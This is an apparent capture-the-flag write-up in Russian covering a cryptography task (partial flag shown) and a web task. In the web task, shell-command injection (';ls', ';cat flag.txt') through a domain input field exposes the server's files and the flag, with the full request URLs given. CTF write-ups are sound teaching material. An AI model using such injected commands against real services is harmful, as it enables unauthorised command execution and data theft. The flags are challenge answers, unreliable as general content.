### 1 - криптография

Решение в main.py, код шифратора в encrypt
   
Ответ в secrets.txt, правда, кажется, там только часть флага :(

30d6dcd76c15009ab6b03}

### 2 - веб

Пробуем ввести в поле ввода ";ls" - http://seoscan.semrush.work:8080/?domain=%3Bls
   
Results: 
   
BUILDING.txt CONTRIBUTING.md LICENSE NOTICE README.md RELEASE-NOTES RUNNING.txt bin conf flag.txt include lib logs native-jni-lib python-seo-analyzer-4.0.2 python-seo-analyzer-4.0.2.7z temp webapps webapps.dist work 

Вводим ";cat flag.txt" - http://seoscan.semrush.work:8080/?domain=%3Bcat+flag.txt
   
Results:
   
sem{3x3cu73_1s_v3ry_v333333ry_uns4f3} 
